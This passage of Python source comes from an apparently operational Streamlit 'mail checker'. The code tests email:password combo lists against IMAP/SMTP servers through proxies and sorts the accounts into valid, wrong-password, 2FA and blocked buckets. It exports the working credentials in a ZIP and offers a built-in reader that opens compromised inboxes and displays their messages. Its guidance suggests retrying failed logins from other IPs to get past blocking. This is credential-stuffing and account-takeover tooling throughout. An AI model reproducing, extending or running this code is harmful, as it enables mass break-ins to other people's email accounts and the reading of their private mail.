                        left = []
                        for raw in all_target_accounts:
                            em = raw.split(":", 1)[0].strip().lower() if ":" in raw else raw
                            if em not in done:
                                left.append(raw)
                        if left:
                            save_unfinished("In Progress (Running)", left, checked_count, total_accs)
                        try:
                            _write_clean_valid(f"# Live sync | this run valid {len(valids)}\n",
                                               valids)
                        except Exception:
                            pass

                    if total_accs > 0:
                        pct = min(1.0, checked_count / total_accs)
                        progress_bar.progress(
                            pct, text=f"Checking accounts [{engine_action_mode}]: "
                                      f"{checked_count}/{total_accs} ({int(pct * 100)}%)")
                    with session_state_lock:
                        v_len = len(str_lit.session_state.valid_results)
                        w_len = len(str_lit.session_state.wrong_results)
                        rt_len = len(str_lit.session_state.retry_results)
                        px_len = len(str_lit.session_state.proxy_results)
                        ld_len = len(str_lit.session_state.login_drop_results)
                    status_text.text(
                        f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | "
                        f"Wrong: {w_len} | Login Dropped: {ld_len} | Proxy Dead: {px_len} | "
                        f"RETRY_LATER: {rt_len}")

            finally:
                executor.shutdown(wait=False)

        except MemoryError as me:
            run_interrupted = True
            detected_stop_reason = "Resource Exhaustion: RAM full / Out of Memory"
            runstate.note(detected_stop_reason)
            str_lit.error(f"⚠ Engine Stopped: RAM Full: {me}")
        except (socket.timeout, ConnectionError, ssl.SSLError) as net_err:
            run_interrupted = True
            detected_stop_reason = f"Network Connection Failure: {net_err}"
            runstate.note(detected_stop_reason)
            str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason}")
        except (OSError, IOError) as oe:
            run_interrupted = True
            detected_stop_reason = ("Resource Exhaustion: Disk Space / ROM full"
                                    if getattr(oe, 'errno', 0) == 28
                                    else f"Filesystem / I/O Error: {oe}")
            runstate.note(detected_stop_reason)
            str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason}")
        except BaseException as be:
            if isinstance(be, (SystemExit, KeyboardInterrupt)):
                run_interrupted = True
                detected_stop_reason = "System Shutdown / Interruption"
                raise be
            run_interrupted = True
            _bn = type(be).__name__
            if _bn in ("RerunException", "StopException", "ScriptStopped"):
                detected_stop_reason = "User Interruption: UI interaction (Streamlit rerun)"
                log_probe_event("run stopped by a Streamlit RerunException/StopException")
            else:
                be_str = str(be).lower()
                if any(k in be_str for k in ["rerun", "stop", "scriptrunner", "websocket",
                                             "closed", "connection lost"]):
                    detected_stop_reason = "User Interruption: UI interaction"
                else:
                    detected_stop_reason = f"Unexpected Error / Interruption: {be}"
            runstate.note(detected_stop_reason)
        finally:
            # Restore the slider's own deadline so the sidebar does not report
            # unapplied settings after a run that used the tail cap.
            if _orig_deadline is not None:
                CFG["ACCOUNT_DEADLINE"] = _orig_deadline
            # FIX ISO-4 (v13.49): decrement the count and DERIVE the bool, so a
            # second user's run is not told the deployment went idle when this one
            # ends. max(0, ...) keeps a double release from going negative.
            STATE["runs_active"] = max(0, int(STATE.get("runs_active", 0)) - 1)
            STATE["run_active"] = STATE["runs_active"] > 0
            str_lit.session_state["run_active"] = False
            with session_state_lock:
                done = set(str_lit.session_state.checked_emails_set)
            left = [raw for raw in all_target_accounts
                    if (raw.split(":", 1)[0].strip().lower() if ":" in raw else raw) not in done]
            if checked_count >= total_accs and not run_interrupted:
                # Clean completion: close the watchdog record, then drop the data.
                runstate.finish()
                clear_unfinished()
            elif left:
                save_unfinished(detected_stop_reason, left, checked_count, total_accs)

        end_dt = datetime.now()
        duration = end_dt - start_dt

        with session_state_lock:
            str_lit.session_state.run_completion_status = (
                "Successful" if (checked_count >= total_accs and not run_interrupted)
                else "Unfinished")
            str_lit.session_state.end_timestamp = end_dt.strftime("%Y-%m-%d %H:%M:%S")
            str_lit.session_state.total_duration = str(timedelta(seconds=int(duration.total_seconds())))
            valid_snapshot = list(str_lit.session_state.valid_results)
            wrong_snapshot = list(str_lit.session_state.wrong_results)
            need_snapshot = list(str_lit.session_state.need_app_results)
            login_drop_snapshot = list(str_lit.session_state.login_drop_results)
            conn_snapshot = list(str_lit.session_state.conn_results)
            proxy_snapshot = list(str_lit.session_state.proxy_results)
            retry_snapshot = list(str_lit.session_state.retry_results)
            rbl_snapshot = list(str_lit.session_state.rbl_results)
            smtp_snapshot = list(str_lit.session_state.smtp_results)
            dns_snapshot = list(str_lit.session_state.dns_results)
            skip_snapshot = list(str_lit.session_state.skip_results)
            unknown_snapshot = list(str_lit.session_state.unknown_results)

        invalidate_valid_caches()

        progress_bar.progress(1.0, text="Checking complete!")
        status_text.success(
            f"🎉 Check Complete! Started: {str_lit.session_state.start_timestamp} | "
            f"Ended: {str_lit.session_state.end_timestamp} | "
            f"Duration: {str_lit.session_state.total_duration}")
# @@END 106 RUN_LOOP

# @@BLOCK 107 RUN_EXPORT deps=078,106
        try:
            stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            valid_path = os.path.join(CFG["RESULTS_DIR"], f"valid_{stamp}.txt")
            wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
            need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
            failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
            proxy_path = os.path.join(CFG["RESULTS_DIR"], f"proxy_unhealthy_{stamp}.txt")
            login_drop_path = os.path.join(CFG["RESULTS_DIR"], f"login_dropped_{stamp}.txt")
            retry_path = os.path.join(CFG["RESULTS_DIR"], f"retry_later_{stamp}.txt")
            rbl_path = os.path.join(CFG["RESULTS_DIR"], f"rbl_blocked_{stamp}.txt")
            smtp_path = os.path.join(CFG["RESULTS_DIR"], f"smtp_failed_{stamp}.txt")
            dns_path = os.path.join(CFG["RESULTS_DIR"], f"dns_failed_{stamp}.txt")
            skip_path = os.path.join(CFG["RESULTS_DIR"], f"skipped_{stamp}.txt")
            unknown_path = os.path.join(CFG["RESULTS_DIR"], f"unclassified_{stamp}.txt")
            try:
                os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
            except OSError:
                pass

            hdr = (f"# Started: {str_lit.session_state.start_timestamp} | "
                   f"Ended: {str_lit.session_state.end_timestamp} | "
                   f"Duration: {str_lit.session_state.total_duration} | "
                   f"Protocols: {'+'.join(active_protocols())} | Build: {BUILD_TAG}\n")
            with file_write_lock:
                for path, snap in ((valid_path, valid_snapshot), (wrong_path, wrong_snapshot),
                                   (need_path, need_snapshot),
                                   (login_drop_path, login_drop_snapshot),
                                   (failed_path, conn_snapshot),
                                   (proxy_path, proxy_snapshot),
                                   (retry_path, retry_snapshot), (rbl_path, rbl_snapshot),
                                   (smtp_path, smtp_snapshot), (dns_path, dns_snapshot),
                                   (skip_path, skip_snapshot), (unknown_path, unknown_snapshot)):
                    with open(path, "w", encoding="utf-8") as f:
                        f.write(hdr)
                        f.write("\n".join(str(i) for i in snap) + ("\n" if snap else ""))

            clean_valid_path = CLEAN_VALID_FILE
            temp_clean_count = _write_clean_valid(hdr, valid_snapshot)

            # v13.48: the bundle used to be written to the working directory as a
            # bare mail_results_<stamp>.zip, so two users finishing in the same
            # second overwrote each other's file. Prefix it with the session's own
            # user prefix - the same prefix every other per-user file carries.
            zip_output_name = f"{_cache_owner() or 'anon'}_mail_results_{stamp}.zip"
            with zipfile.ZipFile(zip_output_name, "w", zipfile.ZIP_DEFLATED) as z:
                for p, arc in ((clean_valid_path, "valid_email_password.txt"),
                               (wrong_path, os.path.basename(wrong_path)),
                               (need_path, os.path.basename(need_path)),
                               (login_drop_path, os.path.basename(login_drop_path)),
                               (failed_path, os.path.basename(failed_path)),
                               (proxy_path, os.path.basename(proxy_path)),
                               (retry_path, os.path.basename(retry_path)),
                               (rbl_path, os.path.basename(rbl_path)),
                               (smtp_path, os.path.basename(smtp_path)),
                               (dns_path, os.path.basename(dns_path)),
                               (skip_path, os.path.basename(skip_path)),
                               (unknown_path, os.path.basename(unknown_path))):
                    if os.path.exists(p):
                        z.write(p, arcname=arc)

            zip_bytes_data = b""
            if os.path.exists(zip_output_name):
                with open(zip_output_name, "rb") as fp:
                    zip_bytes_data = fp.read()

            with session_state_lock:
                str_lit.session_state.clean_valid_count = temp_clean_count
                str_lit.session_state.zip_name = zip_output_name
                str_lit.session_state.zip_bytes = zip_bytes_data
        except Exception as ex:
            str_lit.error(f"Error compiling results export files: {ex}")
# @@END 107 RUN_EXPORT

# @@BLOCK 108 RESULTS_SUMMARY deps=007,035,036,037,087,106
if str_lit.session_state.engine_has_run or load_persistent_valid_results():
    section_title("📊", "Live Results Summary & ZIP Archive",
                  "persisted results, downloadable bundle, full under-the-hood traces")

    with session_state_lock:
        status_label = ("🎉 Check Complete!"
                        if str_lit.session_state.run_completion_status == "Successful"
                        else "⚠️ Unfinished / Loaded from Disk")
        clean_count_val = str_lit.session_state.get("run_valid_count",
                                                    str_lit.session_state.clean_valid_count)
        wrong_len_val = len(str_lit.session_state.wrong_results)
        need_len_val = len(str_lit.session_state.need_app_results)
        login_drop_len_val = len(str_lit.session_state.login_drop_results)
        conn_len_val = len(str_lit.session_state.conn_results)
        proxy_len_val = len(str_lit.session_state.proxy_results)
        retry_len_val = len(str_lit.session_state.retry_results)
        rbl_len_val = len(str_lit.session_state.rbl_results)
        smtp_len_val = len(str_lit.session_state.get("pre_smtp_failed", []))
        dns_len_val = len(str_lit.session_state.get("pre_dns_failed", []))
        skip_len_val = len(str_lit.session_state.skip_results)
        unknown_len_val = len(str_lit.session_state.unknown_results)
        valid_res_copy = list(str_lit.session_state.valid_results)
        log_lines_copy = list(str_lit.session_state.log_lines)
        report_entries_copy = list(str_lit.session_state.report_entries)
        zip_bytes_copy = str_lit.session_state.zip_bytes
        zip_name_copy = str_lit.session_state.zip_name
        start_ts_copy = str_lit.session_state.start_timestamp
        end_ts_copy = str_lit.session_state.end_timestamp
        duration_copy = str_lit.session_state.total_duration
        summary_buckets = {
            "✅ Valid Accounts Found": list(str_lit.session_state.valid_results),
            "❌ Wrong Password Found": list(str_lit.session_state.wrong_results),
            "🚪 Login Dropped (* BYE) - server answered, password untested":
                list(str_lit.session_state.login_drop_results),
            "🔌 Connection Failed Found": list(str_lit.session_state.conn_results),
            "🩹 Proxy Unhealthy Found": list(str_lit.session_state.proxy_results),
            "🔐 App Password / 2FA Found": list(str_lit.session_state.need_app_results),
            "🕓 RETRY_LATER Found": list(str_lit.session_state.retry_results),
            "🚫 RBL Blocked Found": list(str_lit.session_state.rbl_results),
            "🛰 DNS Failed (pre-check)": list(str_lit.session_state.get("pre_dns_failed", [])),
            "📮 SMTP Failed (pre-check)": list(str_lit.session_state.get("pre_smtp_failed", [])),
            "⏭ Skipped / Filtered": list(str_lit.session_state.skip_results),
            "❓ Unclassified": list(str_lit.session_state.unknown_results),
        }

    str_lit.markdown(f"### {status_label}")
    str_lit.caption(f"Protocols dialled this run: **{' + '.join(active_protocols())}**"
                    + ("  ·  SMTP/ManageSieve were CONFIRM-ONLY"
                       if any(p in ("SMTP", "ManageSieve") for p in active_protocols()) else ""))

    if str_lit.session_state.run_completion_status == "Unfinished":
        # FIX RS-4: the reason came from list_unfinished_runs(), so the TypeError
        # in block 083 degraded this to a bare warning with no cause and no
        # progress. It reads the watchdog record and remaining() directly now.
        _rec = runstate.load() or {}
        _left = runstate.remaining()
        if _rec or _left:
            str_lit.warning(
                f"⚠ **Engine Stopped Unfinished:** Reason: "
                f"*{_rec.get('reason') or _rec.get('cause') or 'Unknown'}* | "
                f"Progress at stop: {_rec.get('checked', 0)}/{_rec.get('total', 0)} | "
                f"**{len(_left)} account(s) still to check** - set Engine Action Mode "
                f"to 'Resume Unfinished' and press Start to continue.")
        else:
            str_lit.warning("⚠ **Engine Stopped Unfinished.**")

    if start_ts_copy and end_ts_copy:
        str_lit.info(f"⏱ **Session Timestamps:** Started **{start_ts_copy}** | "
                     f"Ended **{end_ts_copy}** | Duration **{duration_copy}**")

    _s_pairs = [
        ("✅ Clean Valid", clean_count_val),
        ("❌ Wrong Password", wrong_len_val),
        ("🔑 App Password / 2FA", need_len_val),
        ("🚪 Login Dropped", login_drop_len_val),
        ("🔌 Connection Failed", conn_len_val),
        ("🩹 Proxy Unhealthy", proxy_len_val),
        ("🚫 RBL Blocked", rbl_len_val),
        ("🕓 RETRY_LATER", retry_len_val),
        ("🛰 DNS Failed", dns_len_val),
        ("📮 SMTP Failed", smtp_len_val),
        ("⏭ Skipped", skip_len_val),
        ("❓ Unclassified", unknown_len_val),
        ("📚 Accounts In Buckets",
         clean_count_val + wrong_len_val + need_len_val + login_drop_len_val
         + conn_len_val + proxy_len_val + rbl_len_val + retry_len_val + skip_len_val
         + unknown_len_val),
    ]
    for _sc, (_sl, _sv) in zip(metric_grid(_s_pairs, per_row=3), _s_pairs):
        _sc.metric(_sl, _sv)

    if login_drop_len_val:
        str_lit.warning(
            f"🚪 **{login_drop_len_val} account(s) hit a LOGIN DROP** - the mail server "
            f"ANSWERED, accepted the LOGIN command and then closed the socket (* BYE). "
            f"These passwords are still UNTESTED: it is usually a rejected password or an "
            f"app-password requirement, so retry them from a different IP (or with an app "
            f"password) before discarding them.")
    if proxy_len_val:
        str_lit.warning(
            f"🩹 **{proxy_len_val} account(s) never reached a mailbox** - every attempt died "
            f"with 407 Proxy Authentication Required. Those passwords are still UNTESTED.")
    if skip_len_val:
        str_lit.info(
            f"⏭ **{skip_len_val} account(s) were skipped** (bad format / disposable / "
            f"fast-mode cooldown). They were counted as checked; they are listed in the "
            f"Skipped bucket and the ZIP.")
    if wrong_len_val and CFG.get("CONFIRM_WRONG_ACROSS_HOSTS", True):
        str_lit.caption(
            "❌ Wrong Password was CONFIRMED across at least two hosts or two rungs (or with "
            "no candidate left to dial) before being accepted. Turn the sidebar guard OFF "
            "only if you need raw speed.")

    for title, items in summary_buckets.items():
        with str_lit.expander(f"{title} ({len(items)})", expanded=False):
            if not items:
                str_lit.caption("nothing here yet")
                continue
            _safe = "".join(ch if ch.isalnum() else "_" for ch in title).strip("_")
            str_lit.download_button(
                f"Download these {len(items)} line(s)",
                data="\n".join(str(i) for i in items).encode("utf-8"),
                file_name=f"{_safe}_{len(items)}.txt",
                mime="text/plain", key=f"sumdl_{_safe}")
            for it in items:
                str_lit.code(it, language="text")

    exec_tab1_p, exec_tab2_p = str_lit.tabs(["⚡ Live Execution Stream",
                                             "📊 Live Report Log & Analytics"])
    with exec_tab1_p:
        if log_lines_copy:
            render_logs(log_lines_copy)
        else:
            str_lit.info("No logs available from previous run.")
    with exec_tab2_p:
        if report_entries_copy:
            str_lit.dataframe(pd.DataFrame(report_entries_copy[::-1]),
                              width="stretch", height=320)
        else:
            str_lit.info("No report logs available.")

    if zip_bytes_copy and zip_name_copy:
        str_lit.download_button("📦 Download All Results (.zip Package)", data=zip_bytes_copy,
                                file_name=zip_name_copy, mime="application/zip")
# @@END 108 RESULTS_SUMMARY

# @@BLOCK 109 IN_APP_READER deps=034,053,062,069,093,098
section_title("📬", "Mailbox Reader (Interactive Inbox Inspection)",
              "read verified inboxes without leaving the app")

with session_state_lock:
    current_valid_set = list(str_lit.session_state.valid_results) or load_persistent_valid_results()

if not current_valid_set:
    str_lit.info("Run the checker successfully or ensure valid account files exist to "
                 "populate valid accounts.")
else:
    valid_combo_options = []
    for item in current_valid_set:
        try:
            if ":" in item:
                email_val, remainder = item.split(":", 1)
                valid_combo_options.append(f"{email_val.strip()}:{remainder.split('|')[0].strip()}")
        except Exception:
            continue

    if valid_combo_options:
        selected_combo = str_lit.selectbox("Select Valid Account to Read:",
                                           options=valid_combo_options, key="bb_reader_acct")
        max_msgs = str_lit.slider("Number of Recent Messages to Fetch", 1, 50, 10, 1,
                                  key="bb_reader_max")

        if str_lit.button("📖 Read Inbox Messages"):
            if selected_combo:
                acc_email, acc_pass = selected_combo.split(":", 1)
                acc_email, acc_pass = acc_email.strip(), acc_pass.strip()
                imap_hosts = get_servers(acc_email).get("imap", [])
                mailbox_proxy = (sample_alive_proxy(domain=acc_email.split("@")[-1])
                                 if use_proxy else None)

                if not imap_hosts:
                    str_lit.error("No IMAP host available for this provider domain name.")
                else:
                    with str_lit.spinner(f"Connecting via [{px_tag(mailbox_proxy)}] and "
                                         f"fetching inbox for {acc_email}..."):
                        # v13.48: read_mailbox_messages() already resolves the whole
                        # host ladder itself via get_servers() and falls back to the
                        # host passed in. The old `for srv in imap_hosts:` loop re-ran
                        # that entire ladder once per host, so a 4-host domain could
                        # open 4x4 ladders and burn proxy credit before giving up.
                        success_read, fetched_msgs = False, []
                        msgs = read_mailbox_messages(acc_email, acc_pass, imap_hosts[0],
                                                     proxy_str=mailbox_proxy,
                                                     limit=max_msgs)
                        if msgs and not any("Error reading mailbox" in m for m in msgs):
                            fetched_msgs, success_read = msgs, True
                        elif msgs:
                            fetched_msgs = msgs
                        if success_read:
                            str_lit.success("Successfully retrieved recent messages "
                                            "from mailbox!")
                            for idx, m_content in enumerate(fetched_msgs, 1):
                                str_lit.markdown(f"**Message {idx}:**")
                                str_lit.code(m_content, language="text")
                        else:
                            str_lit.warning(f"Could not read mailbox: {fetched_msgs}")
# @@END 109 IN_APP_READER

# @@BLOCK 110 FOOTER deps=008,034
section_title("🧭", "Navigation", f"{BUILD_TAG} - block edition")

_n1, _n2, _n3, _n4 = str_lit.columns(4)
with _n1:
    try:
        str_lit.page_link("pages/3_Mailbox_Reader.py", label="📥 Mailbox Reader",
                          width="stretch")
    except Exception:
        str_lit.caption("Reader lives at pages/3_Mailbox_Reader.py")
with _n2:
    try:
        str_lit.page_link("pages/2_Diagnostics.py", label="🔍 Diagnostics",
                          width="stretch")
    except Exception:
        str_lit.caption("Diagnostics lives at pages/2_Diagnostics.py")
with _n3:
    try:
        str_lit.page_link("pages/4_Downloads.py", label="📦 Export Studio",
                          width="stretch")
    except Exception:
        str_lit.caption("Export Studio lives at pages/4_Downloads.py")
with _n4:
    try:
        str_lit.page_link("pages/6_User_Guide.py", label="📖 User Guide",
                          width="stretch")
    except Exception:
        str_lit.caption("User Guide lives at pages/6_User_Guide.py")

str_lit.caption(
    f"Build {BUILD_TAG} · CFG {CFG_VERSION} · block edition. "
    f"Every section is a replaceable @@BLOCK - run verify_blocks.py after every paste."
)
# @@END 110 FOOTER
# @@EOF
